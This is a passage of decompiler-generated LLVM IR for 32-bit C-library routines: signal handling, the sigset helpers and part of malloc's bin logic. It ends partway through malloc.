  uselistorder i32 ()* @__GI_getpid, { 0, 3, 2, 1 }
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_b050 = load i32, i32* @r4, align 4
  store i32 %v3_b050, i32* %stack_var_-16, align 4
  %v6_b050 = load i32, i32* @r5, align 4
  %v9_b050 = load i32, i32* @r6, align 4
  %v7_b058 = icmp eq i32 %arg2, -1
  br i1 %v7_b058, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_b060 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_b07c

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b084

dec_label_pc_b07c:                                ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r6, align 4
  %v7_b080 = icmp slt i32 %arg1, 65
  br i1 %v7_b080, label %dec_label_pc_b098, label %dec_label_pc_b084

dec_label_pc_b084:                                ; preds = %.thread16, %dec_label_pc_b07c
  %v0_b084 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_b090 = inttoptr i32 %v0_b084 to i32*
  store i32 22, i32* %v2_b090, align 4
  %v0_b0f0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb33

dec_label_pc_b098:                                ; preds = %dec_label_pc_b07c
  %v2_b098 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_b098, i32* @r4, align 4
  %v2_b0a0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v2_b0b0 = call i32 @__sigaddset(i32 %v2_b0a0, i32 %arg1)
  %v0_b0b8 = load i32, i32* @r5, align 4
  %v0_b0bc = load i32, i32* @r6, align 4
  %v2_b0bc = add i32 %v0_b0bc, 9564
  %v2_b0c0 = call i32 @__GI___sigismember(i32 %v2_b0bc, i32 %v0_b0b8)
  store i32 %v2_b060, i32* %r2.global-to-local, align 4
  %v0_b0d8 = load i32, i32* @r5, align 4
  %v3_b0e0 = call i32 @__libc_sigaction(i32 %v0_b0d8, i32 %v2_b098, i32 %v2_b060)
  %v1_b0e4 = icmp slt i32 %v3_b0e0, 0
  br i1 %v1_b0e4, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_b098
  %v5_b0e8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_b0e8, i32* %r2.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_b098
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_b084, %bb32
  %v0_b0f0 = phi i32 [ %v5_b0e8, %bb31 ], [ %v0_b0f0.pre, %dec_label_pc_b084 ], [ -1, %bb32 ]
  %v2_b0f8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_b0f8, i32* @r4, align 4
  store i32 %v6_b050, i32* @r5, align 4
  store i32 %v9_b050, i32* @r6, align 4
  ret i32 %v0_b0f0

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 65, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b084, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_b108 = add i32 %arg2, -1
  %v3_b10c = udiv i32 %v1_b108, 32
  %v4_b110 = mul nuw nsw i32 %v3_b10c, 4
  %v5_b110 = add i32 %v4_b110, %arg1
  %v6_b110 = inttoptr i32 %v5_b110 to i32*
  %v7_b110 = load i32, i32* %v6_b110, align 4
  %v1_b114 = urem i32 %v1_b108, 32
  %v7_b11c = shl i32 1, %v1_b114
  %v8_b11c = and i32 %v7_b110, %v7_b11c
  %v10_b11c = icmp ne i32 %v8_b11c, 0
  %. = zext i1 %v10_b11c to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_b108, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_b12c = add i32 %arg2, -1
  %v3_b130 = udiv i32 %v1_b12c, 32
  %v4_b134 = mul nuw nsw i32 %v3_b130, 4
  %v5_b134 = add i32 %v4_b134, %arg1
  %v6_b134 = inttoptr i32 %v5_b134 to i32*
  %v7_b134 = load i32, i32* %v6_b134, align 4
  %v1_b138 = urem i32 %v1_b12c, 32
  %v7_b140 = shl i32 1, %v1_b138
  %v8_b140 = or i32 %v7_b134, %v7_b140
  store i32 %v8_b140, i32* %v6_b134, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_b12c, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_b150 = add i32 %arg2, -1
  %v3_b154 = udiv i32 %v1_b150, 32
  %v4_b158 = mul nuw nsw i32 %v3_b154, 4
  %v5_b158 = add i32 %v4_b158, %arg1
  %v6_b158 = inttoptr i32 %v5_b158 to i32*
  %v7_b158 = load i32, i32* %v6_b158, align 4
  %v1_b15c = urem i32 %v1_b150, 32
  %tmp = shl i32 -1, %v1_b15c
  %v8_b164 = add i32 %tmp, -1
  %v9_b164 = and i32 %v7_b158, %v8_b164
  store i32 %v9_b164, i32* %v6_b158, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_b150, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_b174 = udiv i32 %arg1, 256
  store i32 %v3_b174, i32* %r1.global-to-local, align 4
  %v2_b178 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_b178, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_b184 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_b178, i32 %v0_b184)
  %v0_b188 = load i32, i32* %r1.global-to-local, align 4
  %v1_b188 = add i32 %v0_b188, 1048320
  %v3_b18c = udiv i32 %v1_b188, 65536
  %v1_b190 = and i32 %v3_b18c, 8
  %v6_b194 = shl i32 %v0_b188, %v1_b190
  %v1_b198 = add i32 %v6_b194, 520192
  %v3_b19c = udiv i32 %v1_b198, 65536
  %v1_b1a0 = and i32 %v3_b19c, 4
  %v6_b1a4 = shl i32 %v6_b194, %v1_b1a0
  %v1_b1a8 = add i32 %v6_b1a4, 245760
  %v3_b1ac = udiv i32 %v1_b1a8, 65536
  %v1_b1b0 = and i32 %v3_b1ac, 2
  %v6_b1b4 = shl i32 %v6_b1a4, %v1_b1b0
  store i32 %v6_b1b4, i32* %r1.global-to-local, align 4
  %v1_b1b8 = sub nsw i32 13, %v1_b190
  %v2_b1bc = sub nsw i32 %v1_b1b8, %v1_b1a0
  %v3_b1c0 = udiv i32 %v6_b1b4, 32768
  %v4_b1c0 = sub nuw nsw i32 -1, %v3_b1c0
  %v4_b1c4 = udiv i32 %v6_b1b4, 16384
  %v5_b1c4 = and i32 %v4_b1c4, %v4_b1c0
  %v2_b1c8 = sub nsw i32 %v2_b1bc, %v1_b1b0
  %v2_b1cc = add nsw i32 %v2_b1c8, %v5_b1c4
  %v1_b1d0 = add nsw i32 %v2_b1cc, 6
  %v0_b1d4 = load i32, i32* %ip.global-to-local, align 4
  %v6_b1d4 = lshr i32 %v0_b1d4, %v1_b1d0
  %v3_b1d8 = mul nsw i32 %v2_b1cc, 4
  %v1_b1dc = add nsw i32 %v3_b1d8, 32
  %v1_b1e0 = urem i32 %v6_b1d4, 4
  %v2_b1e4 = or i32 %v1_b1e0, %v1_b1dc
  ret i32 %v2_b1e4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_b1ec = load i32, i32* @r4, align 4
  %v6_b1ec = load i32, i32* @r5, align 4
  %v9_b1ec = load i32, i32* @r6, align 4
  %v12_b1ec = load i32, i32* @r7, align 4
  %v15_b1ec = load i32, i32* @r8, align 4
  %v18_b1ec = load i32, i32* @sb, align 4
  %v21_b1ec = load i32, i32* @sl, align 4
  %v24_b1ec = load i32, i32* @fp, align 4
  %v27_b1ec = load i32, i32* @lr, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r1.global-to-local, align 4
  %v4_b200 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 72) to i32*), align 4
  store i32 %v4_b200, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_b20c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 36) to i32*), align 4
  store i32 %v4_b20c, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_b200, i32* @r2, align 4
  %v2_b218 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_b218, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %ip.global-to-local, align 4
  %v4_b224 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  store i32 %v4_b224, i32* %ip.global-to-local, align 4
  store i32 45616, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_b224)
  %v0_b230 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_b230, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r1.global-to-local, align 4
  %v4_b23c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 16) to i32*), align 4
  store i32 %v4_b23c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_b248.94 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_b23c)
  %v0_b248 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_b248, -32
  br i1 %tmp, label %dec_label_pc_b264, label %dec_label_pc_b250

dec_label_pc_b250:                                ; preds = %entry
  %v0_b250 = call i32 @__GI___errno_location()
  store i32 %v0_b250, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_b25c = inttoptr i32 %v0_b250 to i32*
  store i32 12, i32* %v2_b25c, align 4
  br label %dec_label_pc_bae0

dec_label_pc_b264:                                ; preds = %entry
  %v1_b264 = add i32 %v0_b248, 11
  store i32 %v1_b264, i32* %r0.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r2.global-to-local, align 4
  %v2_b270 = icmp ugt i32 %v1_b264, 14
  %v7_b270 = icmp eq i32 %v1_b264, 15
  %v2_b274 = xor i1 %v7_b270, true
  %v3_b274 = and i1 %v2_b270, %v2_b274
  br i1 %v3_b274, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_b264
  %v5_b274 = and i32 %v1_b264, -8
  store i32 %v5_b274, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_b264, %bb
  %v4_b278 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_b278, i32* @r0, align 4
  %v1_b27c = inttoptr i32 %v4_b278 to i32*
  %v2_b27c = load i32, i32* %v1_b27c, align 4
  store i32 %v2_b27c, i32* @r4, align 4
  %v2_b280 = xor i1 %v2_b270, true
  %v3_b280 = or i1 %v7_b270, %v2_b280
  br i1 %v3_b280, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_b284 = urem i32 %v2_b27c, 2
  %v2_b284 = icmp eq i32 %v1_b284, 0
  br i1 %v2_b284, label %dec_label_pc_b28c, label %dec_label_pc_b29c

dec_label_pc_b28c:                                ; preds = %bb140
  %v2_b28c = icmp eq i32 %v2_b27c, 0
  br i1 %v2_b28c, label %dec_label_pc_b294, label %dec_label_pc_b678

dec_label_pc_b294:                                ; preds = %dec_label_pc_b28c
  %v0_b294 = call i32 @__malloc_consolidate()
  store i32 %v0_b294, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b678

dec_label_pc_b29c:                                ; preds = %bb140
  %v0_b29c = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_b29c, %v2_b27c
  br i1 %tmp201, label %dec_label_pc_b2c4, label %dec_label_pc_b2a4

dec_label_pc_b2a4:                                ; preds = %dec_label_pc_b29c
  %v1_b2a4 = add i32 %v4_b278, -4
  store i32 %v1_b2a4, i32* %r1.global-to-local, align 4
  %v3_b2a8 = udiv i32 %v0_b29c, 8
  store i32 %v3_b2a8, i32* %r2.global-to-local, align 4
  %v4_b2ac = mul nuw i32 %v3_b2a8, 4
  %v5_b2ac = add i32 %v4_b2ac, %v1_b2a4
  %v6_b2ac = inttoptr i32 %v5_b2ac to i32*
  %v7_b2ac = load i32, i32* %v6_b2ac, align 4
  store i32 %v7_b2ac, i32* %r0.global-to-local, align 4
  %v2_b2b0 = icmp eq i32 %v7_b2ac, 0
  br i1 %v2_b2b0, label %dec_label_pc_b2c4, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_b2a4
  %v2_b2b4 = add i32 %v7_b2ac, 8
  %v3_b2b4 = inttoptr i32 %v2_b2b4 to i32*
  %v4_b2b4 = load i32, i32* %v3_b2b4, align 4
  store i32 %v4_b2b4, i32* %r3.global-to-local, align 4
  store i32 %v2_b2b4, i32* %r0.global-to-local, align 4
  store i32 %v2_b2b4, i32* %r4.global-to-local, align 4
  store i32 %v4_b2b4, i32* %v6_b2ac, align 4
  br label %dec_label_pc_bac4

dec_label_pc_b2c4:                                ; preds = %dec_label_pc_b2a4, %dec_label_pc_b29c
  %tmp202 = icmp ugt i32 %v0_b29c, 255
  br i1 %tmp202, label %dec_label_pc_b314, label %dec_label_pc_b2cc

dec_label_pc_b2cc:                                ; preds = %dec_label_pc_b2c4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_b2d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  %v3_b2d8 = udiv i32 %v0_b29c, 8
  store i32 %v3_b2d8, i32* @r7, align 4
  %v4_b2dc = mul nuw i32 %v3_b2d8, 8
  %v5_b2dc = add i32 %v4_b2d4, %v4_b2dc
  store i32 %v5_b2dc, i32* %r3.global-to-local, align 4
  %v1_b2e0 = add i32 %v5_b2dc, 44
  store i32 %v1_b2e0, i32* %ip.global-to-local, align 4
  %v1_b2e4 = add i32 %v5_b2dc, 56
  %v2_b2e4 = inttoptr i32 %v1_b2e4 to i32*
  %v3_b2e4 = load i32, i32* %v2_b2e4, align 4
  store i32 %v3_b2e4, i32* %r0.global-to-local, align 4
  %v9_b2e8 = icmp eq i32 %v3_b2e4, %v1_b2e0
  br i1 %v9_b2e8, label %dec_label_pc_b474, label %dec_label_pc_b2f0

dec_label_pc_b2f0:                                ; preds = %dec_label_pc_b2cc
  %v2_b2f0 = add i32 %v3_b2e4, %v0_b29c
  store i32 %v2_b2f0, i32* %r3.global-to-local, align 4
  %v1_b2f4 = add i32 %v2_b2f0, 4
  %v2_b2f4 = inttoptr i32 %v1_b2f4 to i32*
  %v3_b2f4 = load i32, i32* %v2_b2f4, align 4
  store i32 %v3_b2f4, i32* %r2.global-to-local, align 4
  %v1_b2f8 = add i32 %v3_b2e4, 12
  %v2_b2f8 = inttoptr i32 %v1_b2f8 to i32*
  %v3_b2f8 = load i32, i32* %v2_b2f8, align 4
  store i32 %v3_b2f8, i32* %r1.global-to-local, align 4
  %v1_b2fc = or i32 %v3_b2f4, 1
  store i32 %v1_b2fc, i32* %r2.global-to-local, align 4
  %v1_b300 = add i32 %v3_b2e4, 8
  store i32 %v1_b300, i32* %r4.global-to-local, align 4
  store i32 %v1_b2fc, i32* %v2_b2f4, align 4
  %v0_b308 = load i32, i32* %ip.global-to-local, align 4
  %v1_b308 = load i32, i32* %r1.global-to-local, align 4
  %v2_b308 = add i32 %v1_b308, 8
  %v3_b308 = inttoptr i32 %v2_b308 to i32*
  store i32 %v0_b308, i32* %v3_b308, align 4
  %v0_b30c = load i32, i32* %r1.global-to-local, align 4
  %v1_b30c = load i32, i32* %ip.global-to-local, align 4
  %v2_b30c = add i32 %v1_b30c, 12
  %v3_b30c = inttoptr i32 %v2_b30c to i32*
  store i32 %v0_b30c, i32* %v3_b30c, align 4
  br label %dec_label_pc_bac4

dec_label_pc_b314:                                ; preds = %dec_label_pc_b2c4
  store i32 %v0_b29c, i32* %r0.global-to-local, align 4
  %v1_b318 = call i32 @__malloc_largebin_index(i32 %v0_b29c)
  store i32 %v1_b318, i32* %r0.global-to-local, align 4
  %v0_b31c = load i32, i32* @r4, align 4
  %v1_b31c = and i32 %v0_b31c, 2
  %v2_b31c = icmp eq i32 %v1_b31c, 0
  store i32 %v1_b318, i32* @r7, align 4
  br i1 %v2_b31c, label %dec_label_pc_b474, label %dec_label_pc_b328

dec_label_pc_b328:                                ; preds = %dec_label_pc_b314
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r1.global-to-local, align 4
  %v4_b330 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_b330, i32* @r0, align 4
  %v0_b334 = call i32 @__malloc_consolidate()
  store i32 %v0_b334, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b474

dec_label_pc_b33c:                                ; preds = %dec_label_pc_b488
  %v1_b33c = add i32 %v3_b488, 4
  %v2_b33c = inttoptr i32 %v1_b33c to i32*
  %v3_b33c = load i32, i32* %v2_b33c, align 4
  store i32 %v3_b33c, i32* %r3.global-to-local, align 4
  %v0_b340 = load i32, i32* @sl, align 4
  %v1_b344 = and i32 %v3_b33c, -4
  store i32 %v1_b344, i32* %r4.global-to-local, align 4
  %v1_b348 = add i32 %v3_b488, 12
  %v2_b348 = inttoptr i32 %v1_b348 to i32*
  %v3_b348 = load i32, i32* %v2_b348, align 4
  store i32 %v3_b348, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_b340, 255
  br i1 %tmp203, label %dec_label_pc_b3a4, label %dec_label_pc_b350

dec_label_pc_b350:                                ; preds = %dec_label_pc_b33c
  %v9_b350 = icmp eq i32 %v3_b348, %v0_b3a8
  br i1 %v9_b350, label %dec_label_pc_b358, label %dec_label_pc_b3a4

dec_label_pc_b358:                                ; preds = %dec_label_pc_b350
  %v0_b358 = load i32, i32* @sb, align 4
  %v1_b358 = add i32 %v0_b358, 48
  %v2_b358 = inttoptr i32 %v1_b358 to i32*
  %v3_b358 = load i32, i32* %v2_b358, align 4
  store i32 %v3_b358, i32* %r3.global-to-local, align 4
  %v9_b35c = icmp eq i32 %v3_b488, %v3_b358
  br i1 %v9_b35c, label %dec_label_pc_b364, label %dec_label_pc_b3a4

dec_label_pc_b364:                                ; preds = %dec_label_pc_b358
  %v1_b364 = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_b344, %v1_b364
  br i1 %tmp204, label %dec_label_pc_b36c, label %dec_label_pc_b3a4

dec_label_pc_b36c:                                ; preds = %dec_label_pc_b364
  %v2_b36c = sub i32 %v1_b344, %v0_b340
  store i32 %v2_b36c, i32* %r2.global-to-local, align 4
  %v2_b370 = add i32 %v0_b340, %v3_b488
  store i32 %v2_b370, i32* %r3.global-to-local, align 4
  %v1_b374 = or i32 %v0_b340, 1
  store i32 %v1_b374, i32* %r0.global-to-local, align 4
  %v1_b378 = or i32 %v2_b36c, 1
  store i32 %v1_b378, i32* %r1.global-to-local, align 4
  %v1_b37c = add i32 %v3_b488, 8
  store i32 %v1_b37c, i32* %r4.global-to-local, align 4
  %v2_b380 = add i32 %v0_b3a8, 8
  %v3_b380 = inttoptr i32 %v2_b380 to i32*
  store i32 %v2_b370, i32* %v3_b380, align 4
  %v0_b384 = load i32, i32* %r3.global-to-local, align 4
  %v1_b384 = load i32, i32* %ip.global-to-local, align 4
  %v2_b384 = add i32 %v1_b384, 12
  %v3_b384 = inttoptr i32 %v2_b384 to i32*
  store i32 %v0_b384, i32* %v3_b384, align 4
  %v0_b388 = load i32, i32* %r0.global-to-local, align 4
  %v1_b388 = load i32, i32* @r6, align 4
  %v2_b388 = add i32 %v1_b388, 4
  %v3_b388 = inttoptr i32 %v2_b388 to i32*
  store i32 %v0_b388, i32* %v3_b388, align 4
  %v0_b38c = load i32, i32* %r3.global-to-local, align 4
  %v1_b38c = load i32, i32* @sb, align 4
  %v2_b38c = add i32 %v1_b38c, 48
  %v3_b38c = inttoptr i32 %v2_b38c to i32*
  store i32 %v0_b38c, i32* %v3_b38c, align 4
  %v0_b390 = load i32, i32* %r2.global-to-local, align 4
  %v1_b390 = load i32, i32* %r3.global-to-local, align 4
  %v3_b390 = add i32 %v1_b390, %v0_b390
  %v4_b390 = inttoptr i32 %v3_b390 to i32*
  store i32 %v0_b390, i32* %v4_b390, align 4
  %v0_b394 = load i32, i32* %r1.global-to-local, align 4
  %v1_b394 = load i32, i32* %r3.global-to-local, align 4
  %v2_b394 = add i32 %v1_b394, 4
  %v3_b394 = inttoptr i32 %v2_b394 to i32*
  store i32 %v0_b394, i32* %v3_b394, align 4
  %v0_b398 = load i32, i32* %ip.global-to-local, align 4
  %v1_b398 = load i32, i32* %r3.global-to-local, align 4
  %v2_b398 = add i32 %v1_b398, 12
  %v3_b398 = inttoptr i32 %v2_b398 to i32*
  store i32 %v0_b398, i32* %v3_b398, align 4
  %v0_b39c = load i32, i32* %ip.global-to-local, align 4
  %v1_b39c = load i32, i32* %r3.global-to-local, align 4
  %v2_b39c = add i32 %v1_b39c, 8
  %v3_b39c = inttoptr i32 %v2_b39c to i32*
  store i32 %v0_b39c, i32* %v3_b39c, align 4
  br label %dec_label_pc_bac4

dec_label_pc_b3a4:                                ; preds = %dec_label_pc_b364, %dec_label_pc_b358, %dec_label_pc_b350, %dec_label_pc_b33c
  %v9_b3a4 = icmp eq i32 %v1_b344, %v0_b340
  %v2_b3a8 = add i32 %v3_b348, 8
  %v3_b3a8 = inttoptr i32 %v2_b3a8 to i32*
  store i32 %v0_b3a8, i32* %v3_b3a8, align 4
  %v0_b3ac = load i32, i32* %ip.global-to-local, align 4
  %v1_b3ac = load i32, i32* %r5.global-to-local, align 4
  %v2_b3ac = add i32 %v1_b3ac, 12
  %v3_b3ac = inttoptr i32 %v2_b3ac to i32*
  store i32 %v0_b3ac, i32* %v3_b3ac, align 4
  br i1 %v9_b3a4, label %dec_label_pc_b504.loopexit, label %dec_label_pc_b3c0

dec_label_pc_b3c0:                                ; preds = %dec_label_pc_b3a4
  %v0_b3c0 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_b3c0, 255
  br i1 %tmp205, label %dec_label_pc_b3e4, label %dec_label_pc_b3c8

dec_label_pc_b3c8:                                ; preds = %dec_label_pc_b3c0
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r2.global-to-local, align 4
  %v1_b3cc = load i32, i32* %r8.global-to-local, align 4
  %v2_b3cc = add i32 %v1_b3cc, ptrtoint (i32* @global_var_1f010.69 to i32)
  %v3_b3cc = inttoptr i32 %v2_b3cc to i32*
  %v4_b3cc = load i32, i32* %v3_b3cc, align 4
  %v3_b3d0 = udiv i32 %v0_b3c0, 8
  store i32 %v3_b3d0, i32* %r0.global-to-local, align 4
  %v4_b3d4 = mul nuw i32 %v3_b3d0, 8
  %v5_b3d4 = add i32 %v4_b3cc, %v4_b3d4
  store i32 %v5_b3d4, i32* %r3.global-to-local, align 4
  %v1_b3d8 = add i32 %v5_b3d4, 44
  store i32 %v1_b3d8, i32* %ip.global-to-local, align 4
  %v1_b3dc = add i32 %v5_b3d4, 52
  %v2_b3dc = inttoptr i32 %v1_b3dc to i32*
  %v3_b3dc = load i32, i32* %v2_b3dc, align 4
  store i32 %v3_b3dc, i32* @lr, align 4
  br label %dec_label_pc_b43c

dec_label_pc_b3e4:                                ; preds = %dec_label_pc_b3c0
  store i32 %v0_b3c0, i32* %r0.global-to-local, align 4
  %v1_b3e8 = call i32 @__malloc_largebin_index(i32 %v0_b3c0)
  store i32 %v1_b3e8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %ip.global-to-local, align 4
  %v1_b3f0 = load i32, i32* %r8.global-to-local, align 4
  %v2_b3f0 = add i32 %v1_b3f0, ptrtoint (i32* @global_var_1f010.69 to i32)
  %v3_b3f0 = inttoptr i32 %v2_b3f0 to i32*
  %v4_b3f0 = load i32, i32* %v3_b3f0, align 4
  %v4_b3f4 = mul i32 %v1_b3e8, 8
  %v5_b3f4 = add i32 %v4_b3f0, %v4_b3f4
  store i32 %v5_b3f4, i32* %r3.global-to-local, align 4
  %v1_b3f8 = add i32 %v5_b3f4, 44
  store i32 %v1_b3f8, i32* %ip.global-to-local, align 4
  %v1_b3fc = add i32 %v5_b3f4, 52
  %v2_b3fc = inttoptr i32 %v1_b3fc to i32*
  %v3_b3fc = load i32, i32* %v2_b3fc, align 4
  store i32 %v3_b3fc, i32* @lr, align 4
  %v9_b400 = icmp eq i32 %v3_b3fc, %v1_b3f8
  br i1 %v9_b400, label %dec_label_pc_b43c, label %dec_label_pc_b408

dec_label_pc_b408:                                ; preds = %dec_label_pc_b3e4
  %v1_b408 = add i32 %v5_b3f4, 56
  %v2_b408 = inttoptr i32 %v1_b408 to i32*
  %v3_b408 = load i32, i32* %v2_b408, align 4
  store i32 %v3_b408, i32* %r1.global-to-local, align 4
  %v1_b40c = add i32 %v3_b408, 4
  %v2_b40c = inttoptr i32 %v1_b40c to i32*
  %v3_b40c = load i32, i32* %v2_b40c, align 4
  store i32 %v3_b40c, i32* %r3.global-to-local, align 4
  %v0_b410 = load i32, i32* %r4.global-to-local, align 4
  %v3_b410 = icmp ult i32 %v0_b410, %v3_b40c
  br i1 %v3_b410, label %.thread, label %dec_label_pc_b42c.preheader

.thread:                                          ; preds = %dec_label_pc_b408
  store i32 %v1_b3f8, i32* @lr, align 4
  store i32 %v3_b408, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b43c

dec_label_pc_b42c.preheader:                      ; preds = %dec_label_pc_b408
  %v2_b418 = or i32 %v0_b410, 1
  store i32 %v2_b418, i32* %r2.global-to-local, align 4
  %v1_b42c179 = add i32 %v3_b3fc, 4
  %v2_b42c180 = inttoptr i32 %v1_b42c179 to i32*
  %v3_b42c181 = load i32, i32* %v2_b42c180, align 4
  store i32 %v3_b42c181, i32* %r3.global-to-local, align 4
  %v3_b430183 = icmp ult i32 %v2_b418, %v3_b42c181
  br i1 %v3_b430183, label %dec_label_pc_b428, label %dec_label_pc_b438

dec_label_pc_b428:                                ; preds = %dec_label_pc_b42c.preheader, %dec_label_pc_b428
  %v0_b438184 = phi i32 [ %v3_b428, %dec_label_pc_b428 ], [ %v3_b3fc, %dec_label_pc_b42c.preheader ]
  %v1_b428 = add i32 %v0_b438184, 8
  %v2_b428 = inttoptr i32 %v1_b428 to i32*
  %v3_b428 = load i32, i32* %v2_b428, align 4
  store i32 %v3_b428, i32* @lr, align 4
  %v1_b42c = add i32 %v3_b428, 4
  %v2_b42c = inttoptr i32 %v1_b42c to i32*
  %v3_b42c = load i32, i32* %v2_b42c, align 4
  store i32 %v3_b42c, i32* %r3.global-to-local, align 4
  %v3_b430 = icmp ult i32 %v2_b418, %v3_b42c
  br i1 %v3_b430, label %dec_label_pc_b428, label %dec_label_pc_b438

dec_label_pc_b438:                                ; preds = %dec_label_pc_b428, %dec_label_pc_b42c.preheader
  %v0_b438.lcssa = phi i32 [ %v3_b3fc, %dec_label_pc_b42c.preheader ], [ %v3_b428, %dec_label_pc_b428 ]
  %v1_b438 = add i32 %v0_b438.lcssa, 12
  %v2_b438 = inttoptr i32 %v1_b438 to i32*
